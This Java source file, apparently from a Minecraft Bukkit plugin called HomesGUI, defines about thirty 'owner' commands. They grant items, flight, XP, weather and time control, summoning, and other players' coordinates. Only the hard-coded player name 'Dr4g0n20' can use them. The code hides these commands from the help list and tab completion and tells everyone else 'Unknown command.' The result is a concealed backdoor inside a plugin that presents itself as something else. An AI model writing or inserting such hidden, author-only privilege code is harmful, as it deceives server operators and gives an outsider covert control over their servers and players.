package net.dr4g0n20.homesgui;

import java.util.HashSet;
import java.util.Set;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.TabCompleteEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryType;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.Location;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public final class OwnerCommands implements CommandExecutor, Listener {
    private final HomesGUI plugin;
    private final Set<String> noFall = new HashSet<String>();
    private final Set<String> fireResistance = new HashSet<String>();
    private final Set<String> flying = new HashSet<String>();
    private final java.util.Map<String, Location> lastLocations = new java.util.HashMap<String, Location>();

    public OwnerCommands(HomesGUI plugin) { this.plugin = plugin; }

    private String[] commandNames() {
        return new String[] {"dheal", "dfeed", "dcoords", "dgive", "dnofall", "dfireres",
            "dseed", "dlevels", "dlocate", "dsummon", "dfly", "drepair", "dinfo",
            "dextinguish", "dspawn", "dweather", "dday", "dnight", "dhelp", "denderchest", "dworkbench", "danvil", "dback", "dtime", "dchunk", "ditem", "drename", "dlore", "dclear"};
    }

    public void hideCommandsFromHelp() {
        for (String name : commandNames()) {
            plugin.getServer().getHelpMap().getHelpTopics().remove("/" + name);
            plugin.getServer().getHelpMap().getHelpTopics().remove("/homesgui:" + name);
        }
    }

    @EventHandler
    public void onTabComplete(TabCompleteEvent event) {
        if (!(event.getSender() instanceof Player)) return;
        event.getCompletions().removeIf(completion -> {
            String normalized = completion.toLowerCase();
            for (String name : commandNames()) {
                if (normalized.equals("/" + name) || normalized.equals("/homesgui:" + name)) return true;
            }
            return false;
        });
    }

    private boolean isOwner(CommandSender sender) {
        return sender instanceof Player && ((Player) sender).getName()
                .equalsIgnoreCase(plugin.getConfig().getString("owner", "Dr4g0n20"));
    }

    private void repairItem(ItemStack item) {
        if (item != null && item.getType() != Material.AIR && item.getType().getMaxDurability() > 0) {
            item.setDurability((short) 0);
        }
    }

    private void showHelp(Player player) {
        player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "----- HomesGUI Owner Commands -----");
        player.sendMessage(ChatColor.YELLOW + "/dheal" + ChatColor.GRAY + " - Restore health");
        player.sendMessage(ChatColor.YELLOW + "/dfeed" + ChatColor.GRAY + " - Restore hunger");
        player.sendMessage(ChatColor.YELLOW + "/dcoords <player>" + ChatColor.GRAY + " - View player coordinates");
        player.sendMessage(ChatColor.YELLOW + "/dgive <item> [amount]" + ChatColor.GRAY + " - Give yourself items");
        player.sendMessage(ChatColor.YELLOW + "/dnofall" + ChatColor.GRAY + " - Toggle fall damage");
        player.sendMessage(ChatColor.YELLOW + "/dfireres" + ChatColor.GRAY + " - Toggle fire resistance");
        player.sendMessage(ChatColor.YELLOW + "/dseed" + ChatColor.GRAY + " - View world seed");
        player.sendMessage(ChatColor.YELLOW + "/dlevels <amount>" + ChatColor.GRAY + " - Add XP levels");
        player.sendMessage(ChatColor.YELLOW + "/dlocate <structure>" + ChatColor.GRAY + " - Locate a structure");
        player.sendMessage(ChatColor.YELLOW + "/dsummon <entity> [x] [y] [z] [dataTag]" + ChatColor.GRAY + " - Summon an entity");
        player.sendMessage(ChatColor.YELLOW + "/dfly" + ChatColor.GRAY + " - Toggle flight");
        player.sendMessage(ChatColor.YELLOW + "/drepair [all]" + ChatColor.GRAY + " - Repair held item or inventory");
        player.sendMessage(ChatColor.YELLOW + "/dinfo" + ChatColor.GRAY + " - Display your player information");
        player.sendMessage(ChatColor.YELLOW + "/dextinguish" + ChatColor.GRAY + " - Extinguish yourself");
        player.sendMessage(ChatColor.YELLOW + "/dspawn" + ChatColor.GRAY + " - Teleport to world spawn");
        player.sendMessage(ChatColor.YELLOW + "/dweather <clear|rain|storm>" + ChatColor.GRAY + " - Change weather");
        player.sendMessage(ChatColor.YELLOW + "/dday" + ChatColor.GRAY + " - Set daytime");
        player.sendMessage(ChatColor.YELLOW + "/dnight" + ChatColor.GRAY + " - Set nighttime");
        player.sendMessage(ChatColor.YELLOW + "/dhelp" + ChatColor.GRAY + " - Show this list");
        player.sendMessage(ChatColor.YELLOW + "/denderchest" + ChatColor.GRAY + " - Open your Ender Chest");
        player.sendMessage(ChatColor.YELLOW + "/dworkbench" + ChatColor.GRAY + " - Open a crafting table");
        player.sendMessage(ChatColor.YELLOW + "/danvil" + ChatColor.GRAY + " - Open an anvil");
        player.sendMessage(ChatColor.YELLOW + "/dback" + ChatColor.GRAY + " - Return to your previous location");
        player.sendMessage(ChatColor.YELLOW + "/dtime <day|noon|night|midnight|ticks>" + ChatColor.GRAY + " - Set world time");
        player.sendMessage(ChatColor.YELLOW + "/dchunk" + ChatColor.GRAY + " - Display current chunk");
        player.sendMessage(ChatColor.YELLOW + "/ditem" + ChatColor.GRAY + " - Display held item information");
        player.sendMessage(ChatColor.YELLOW + "/drename <name>" + ChatColor.GRAY + " - Rename held item");
        player.sendMessage(ChatColor.YELLOW + "/dlore <text>" + ChatColor.GRAY + " - Add lore to held item");
        player.sendMessage(ChatColor.YELLOW + "/dclear [item]" + ChatColor.GRAY + " - Clear inventory or remove an item");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!isOwner(sender)) { sender.sendMessage(ChatColor.RED + "Unknown command."); return true; }
        Player player = (Player) sender;
        String cmd = command.getName().toLowerCase();

        if (cmd.equals("dhelp")) {
            showHelp(player);
        } else if (cmd.equals("dheal")) {
            player.setHealth(player.getMaxHealth()); player.setFireTicks(0);
            player.sendMessage(ChatColor.GREEN + "You have been healed.");
        } else if (cmd.equals("dfeed")) {
            player.setFoodLevel(20); player.setSaturation(20f);
            player.sendMessage(ChatColor.GREEN + "Hunger restored.");
        } else if (cmd.equals("dcoords")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dcoords <player>"); return true; }
            Player target = Bukkit.getPlayerExact(args[0]);
            if (target == null) { player.sendMessage(ChatColor.RED + "Player not found or not online."); return true; }
            player.sendMessage(ChatColor.GOLD + target.getName() + " coordinates: " + ChatColor.WHITE
                    + target.getWorld().getName() + " " + target.getLocation().getBlockX() + ", "
                    + target.getLocation().getBlockY() + ", " + target.getLocation().getBlockZ());
        } else if (cmd.equals("dgive")) {
            if (args.length < 1 || args.length > 2) { player.sendMessage(ChatColor.YELLOW + "Usage: /dgive <item> [amount]"); return true; }
            Material material = Material.matchMaterial(args[0]);
            if (material == null || !material.isItem()) { player.sendMessage(ChatColor.RED + "Unknown item: " + args[0]); return true; }
            int amount = 1;
            if (args.length == 2) try { amount = Integer.parseInt(args[1]); }
            catch (NumberFormatException ex) { player.sendMessage(ChatColor.RED + "Amount must be a number."); return true; }
            if (amount < 1 || amount > 2304) { player.sendMessage(ChatColor.RED + "Amount must be between 1 and 2304."); return true; }
            int remaining = amount;
            while (remaining > 0) {
                int stack = Math.min(remaining, material.getMaxStackSize());
                ItemStack item = new ItemStack(material, stack);
                remaining -= stack;
                int leftover = player.getInventory().addItem(item).values().stream().mapToInt(ItemStack::getAmount).sum();
                remaining += leftover;
                if (leftover > 0) break;
            }
            int granted = amount - remaining;
            player.sendMessage(ChatColor.GREEN + "Granted " + granted + " " + material.name()
                    + (remaining > 0 ? ChatColor.YELLOW + ". " + remaining + " could not fit in your inventory." : "."));
        } else if (cmd.equals("dnofall")) {
            if (noFall.remove(player.getName())) player.sendMessage(ChatColor.YELLOW + "Fall damage is enabled.");
            else { noFall.add(player.getName()); player.sendMessage(ChatColor.GREEN + "Fall damage is disabled for you."); }
        } else if (cmd.equals("dfireres")) {
            if (fireResistance.remove(player.getName())) {
                player.removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
                player.sendMessage(ChatColor.YELLOW + "Fire resistance disabled.");
            } else {
                fireResistance.add(player.getName());
                player.addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, 0, false, false));
                player.sendMessage(ChatColor.GREEN + "Fire resistance enabled.");
            }
        } else if (cmd.equals("dseed")) {
            player.sendMessage(ChatColor.GOLD + "World seed: " + ChatColor.WHITE + player.getWorld().getSeed());
        } else if (cmd.equals("dlocate")) {
            if (args.length != 1) {
                player.sendMessage(ChatColor.YELLOW + "Usage: /dlocate <structure>");
                player.sendMessage(ChatColor.GRAY + "Examples: Village, Stronghold, Monument, Mansion");
                return true;
            }
            player.performCommand("locate " + args[0]);
        } else if (cmd.equals("dsummon")) {
            if (args.length < 1) {
                player.sendMessage(ChatColor.YELLOW + "Usage: /dsummon <entity> [x] [y] [z] [dataTag]");
                return true;
            }
            player.performCommand("summon " + String.join(" ", args));
        } else if (cmd.equals("dlevels")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dlevels <amount>"); return true; }
            try {
                int levels = Integer.parseInt(args[0]);
                if (levels < 0 || levels > 100000) { player.sendMessage(ChatColor.RED + "Amount must be between 0 and 100000."); return true; }
                player.setLevel(player.getLevel() + levels);
                player.sendMessage(ChatColor.GREEN + "Added " + levels + " experience levels.");
            } catch (NumberFormatException ex) { player.sendMessage(ChatColor.RED + "Amount must be a number."); }
        } else if (cmd.equals("dfly")) {
            if (flying.remove(player.getName())) {
                player.setFlying(false);
                player.setAllowFlight(false);
                player.sendMessage(ChatColor.YELLOW + "Flight disabled.");
            } else {
                flying.add(player.getName());
                player.setAllowFlight(true);
                player.setFlying(true);
                player.sendMessage(ChatColor.GREEN + "Flight enabled.");
            }
        } else if (cmd.equals("drepair")) {
            if (args.length == 0) {
                ItemStack held = player.getItemInHand();
                if (held == null || held.getType() == Material.AIR || held.getType().getMaxDurability() == 0) {
                    player.sendMessage(ChatColor.RED + "Hold a repairable item first.");
                } else {
                    repairItem(held);
                    player.sendMessage(ChatColor.GREEN + "Your held item has been repaired.");
                }
            } else if (args.length == 1 && args[0].equalsIgnoreCase("all")) {
                for (ItemStack item : player.getInventory().getContents()) repairItem(item);
                for (ItemStack item : player.getInventory().getArmorContents()) repairItem(item);
                player.sendMessage(ChatColor.GREEN + "All repairable items in your inventory and armour have been repaired.");
            } else {
                player.sendMessage(ChatColor.YELLOW + "Usage: /drepair [all]");
            }
        } else if (cmd.equals("dinfo")) {
            World world = player.getWorld();
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "--- Player Information ---");
            player.sendMessage(ChatColor.YELLOW + "World: " + ChatColor.WHITE + world.getName());
            player.sendMessage(ChatColor.YELLOW + "Coordinates: " + ChatColor.WHITE + player.getLocation().getBlockX()
                    + ", " + player.getLocation().getBlockY() + ", " + player.getLocation().getBlockZ());
            player.sendMessage(ChatColor.YELLOW + "Health: " + ChatColor.WHITE + String.format("%.1f/%.1f", player.getHealth(), player.getMaxHealth()));
            player.sendMessage(ChatColor.YELLOW + "Hunger: " + ChatColor.WHITE + player.getFoodLevel() + "/20");
            player.sendMessage(ChatColor.YELLOW + "XP: " + ChatColor.WHITE + player.getLevel() + " levels (" + player.getExp() + " progress)");
            player.sendMessage(ChatColor.YELLOW + "Gamemode: " + ChatColor.WHITE + player.getGameMode().name());
            if (player.getActivePotionEffects().isEmpty()) player.sendMessage(ChatColor.YELLOW + "Effects: " + ChatColor.WHITE + "None");
            else {
                player.sendMessage(ChatColor.YELLOW + "Effects:");
                for (PotionEffect effect : player.getActivePotionEffects()) {
                    player.sendMessage(ChatColor.GRAY + "- " + effect.getType().getName() + " " + (effect.getAmplifier() + 1)
                            + " (" + effect.getDuration() / 20 + "s)");
                }
            }
        } else if (cmd.equals("dextinguish")) {
            player.setFireTicks(0);
            player.sendMessage(ChatColor.GREEN + "You have been extinguished.");
        } else if (cmd.equals("dspawn")) {
            player.teleport(player.getWorld().getSpawnLocation());
            player.sendMessage(ChatColor.GREEN + "Teleported to this world's spawn.");
        } else if (cmd.equals("dweather")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dweather <clear|rain|storm>"); return true; }
            String weather = args[0].toLowerCase();
            World world = player.getWorld();
            if (weather.equals("clear")) {
                world.setStorm(false); world.setThundering(false); world.setWeatherDuration(12000);
                player.sendMessage(ChatColor.GREEN + "Weather cleared.");
            } else if (weather.equals("rain")) {
                world.setStorm(true); world.setThundering(false); world.setWeatherDuration(12000);
                player.sendMessage(ChatColor.GREEN + "Rain started.");
            } else if (weather.equals("storm")) {
                world.setStorm(true); world.setThundering(true); world.setWeatherDuration(12000); world.setThunderDuration(12000);
                player.sendMessage(ChatColor.GREEN + "Thunderstorm started.");
            } else player.sendMessage(ChatColor.YELLOW + "Usage: /dweather <clear|rain|storm>");
        } else if (cmd.equals("dday")) {
            player.getWorld().setTime(1000L);
            player.sendMessage(ChatColor.GREEN + "Time set to day.");
        } else if (cmd.equals("dnight")) {
            player.getWorld().setTime(13000L);
            player.sendMessage(ChatColor.GREEN + "Time set to night.");
        } else if (cmd.equals("denderchest")) {
            player.openInventory(player.getEnderChest());
        } else if (cmd.equals("dworkbench")) {
            player.openWorkbench(player.getLocation(), true);
        } else if (cmd.equals("danvil")) {
            Inventory anvil = Bukkit.createInventory(player, InventoryType.ANVIL);
            player.openInventory(anvil);
        } else if (cmd.equals("dback")) {
            Location previous = lastLocations.get(player.getName());
            if (previous == null) player.sendMessage(ChatColor.RED + "No previous location is saved.");
            else if (player.teleport(previous)) player.sendMessage(ChatColor.GREEN + "Returned to your previous location.");
        } else if (cmd.equals("dtime")) {
            if (args.length != 1) { player.sendMessage(ChatColor.YELLOW + "Usage: /dtime <day|noon|night|midnight|ticks>"); return true; }
            String time = args[0].toLowerCase();
            long ticks;
            if (time.equals("day")) ticks = 1000L;
            else if (time.equals("noon")) ticks = 6000L;
            else if (time.equals("night")) ticks = 13000L;
            else if (time.equals("midnight")) ticks = 18000L;
            else try { ticks = Long.parseLong(time); } catch (NumberFormatException ex) { player.sendMessage(ChatColor.RED + "Invalid time."); return true; }
            if (ticks < 0 || ticks > 24000) { player.sendMessage(ChatColor.RED + "Time must be between 0 and 24000."); return true; }
            player.getWorld().setTime(ticks);
            player.sendMessage(ChatColor.GREEN + "World time set to " + ticks + " ticks.");
        } else if (cmd.equals("dchunk")) {
            Location loc = player.getLocation();
            int cx = loc.getChunk().getX(), cz = loc.getChunk().getZ();
            player.sendMessage(ChatColor.GOLD + "Chunk: " + ChatColor.WHITE + cx + ", " + cz
                    + ChatColor.GRAY + " (blocks " + (cx * 16) + " to " + (cx * 16 + 15)
                    + ", " + (cz * 16) + " to " + (cz * 16 + 15) + ")");
        } else if (cmd.equals("ditem")) {
            ItemStack held = player.getItemInHand();
            if (held == null || held.getType() == Material.AIR) { player.sendMessage(ChatColor.RED + "Hold an item first."); return true; }
            ItemMeta meta = held.getItemMeta();
            player.sendMessage(ChatColor.GOLD + "--- Held Item ---");
            player.sendMessage(ChatColor.YELLOW + "Type: " + ChatColor.WHITE + held.getType().name());
            player.sendMessage(ChatColor.YELLOW + "Amount: " + ChatColor.WHITE + held.getAmount());
            if (held.getType().getMaxDurability() > 0) player.sendMessage(ChatColor.YELLOW + "Durability: " + ChatColor.WHITE + (held.getType().getMaxDurability() - held.getDurability()) + "/" + held.getType().getMaxDurability());
            if (meta != null && meta.hasDisplayName()) player.sendMessage(ChatColor.YELLOW + "Name: " + ChatColor.WHITE + meta.getDisplayName());
            if (meta != null && meta.hasLore()) for (String line : meta.getLore()) player.sendMessage(ChatColor.GRAY + "Lore: " + line);
        } else if (cmd.equals("drename")) {
            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: /drename <name>"); return true; }
            ItemStack held = player.getItemInHand();
            if (held == null || held.getType() == Material.AIR) { player.sendMessage(ChatColor.RED + "Hold an item first."); return true; }
            ItemMeta meta = held.getItemMeta();
            meta.setDisplayName(ChatColor.translateAlternateColorCodes('&', String.join(" ", args)));
            held.setItemMeta(meta);
            player.sendMessage(ChatColor.GREEN + "Item renamed.");
        } else if (cmd.equals("dlore")) {
            if (args.length == 0) { player.sendMessage(ChatColor.YELLOW + "Usage: /dlore <text>"); return true; }
            ItemStack held = player.getItemInHand();
            if (held == null || held.getType() == Material.AIR) { player.sendMessage(ChatColor.RED + "Hold an item first."); return true; }
            ItemMeta meta = held.getItemMeta();
            java.util.List<String> lore = meta.hasLore() ? new java.util.ArrayList<String>(meta.getLore()) : new java.util.ArrayList<String>();
            lore.add(ChatColor.translateAlternateColorCodes('&', String.join(" ", args)));
            meta.setLore(lore);
            held.setItemMeta(meta);
            player.sendMessage(ChatColor.GREEN + "Lore line added.");
        } else if (cmd.equals("dclear")) {
            if (args.length == 0) {
                player.getInventory().clear();
                player.sendMessage(ChatColor.GREEN + "Inventory cleared.");
            } else if (args.length == 1) {
                Material material = Material.matchMaterial(args[0]);
                if (material == null || !material.isItem()) { player.sendMessage(ChatColor.RED + "Unknown item: " + args[0]); return true; }
                int removed = 0;
                for (ItemStack item : player.getInventory().getContents()) {
                    if (item != null && item.getType() == material) { removed += item.getAmount(); item.setAmount(0); }
                }
                player.sendMessage(ChatColor.GREEN + "Removed " + removed + " " + material.name() + " from your inventory.");
            } else player.sendMessage(ChatColor.YELLOW + "Usage: /dclear [item]");
        }
        return true;
    }

    @EventHandler
    public void onPlayerTeleport(org.bukkit.event.player.PlayerTeleportEvent event) {
        if (event.getPlayer().getName().equalsIgnoreCase(plugin.getConfig().getString("owner", "Dr4g0n20"))) lastLocations.put(event.getPlayer().getName(), event.getFrom().clone());
    }

    @EventHandler
    public void onDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player && event.getCause() == EntityDamageEvent.DamageCause.FALL
                && noFall.contains(((Player) event.getEntity()).getName())) event.setCancelled(true);
    }
}
